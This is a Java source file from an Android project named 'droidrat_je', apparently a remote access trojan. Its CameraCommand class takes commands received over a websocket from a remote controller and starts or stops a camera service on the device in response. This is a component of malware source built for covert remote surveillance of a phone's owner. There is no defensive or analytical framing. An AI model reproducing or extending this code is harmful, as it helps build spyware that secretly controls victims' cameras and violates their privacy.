package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.util.Log;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.service.camera.CameraService;
import com.je_chen.droidrat_je.util.ImageUtil;

import java.io.File;

import static android.content.Intent.FLAG_ACTIVITY_NEW_TASK;
import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;

public class CameraCommand extends CommandFather {

    private final String TAG = "Camera Event";

    private Context context;

    private CameraService cameraService;

    public CameraCommand(Context context) {
        this.context = context;
        cameraService = new CameraService();
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {

                case "StartCamera":
                    Intent startCameraIntent = new Intent(context, CameraService.class);
                    startCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    context.startService(startCameraIntent);
                    break;

                case "StopCamera":
                    Intent stopCameraIntent = new Intent(context, CameraService.class);
                    stopCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                    context.stopService(stopCameraIntent);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
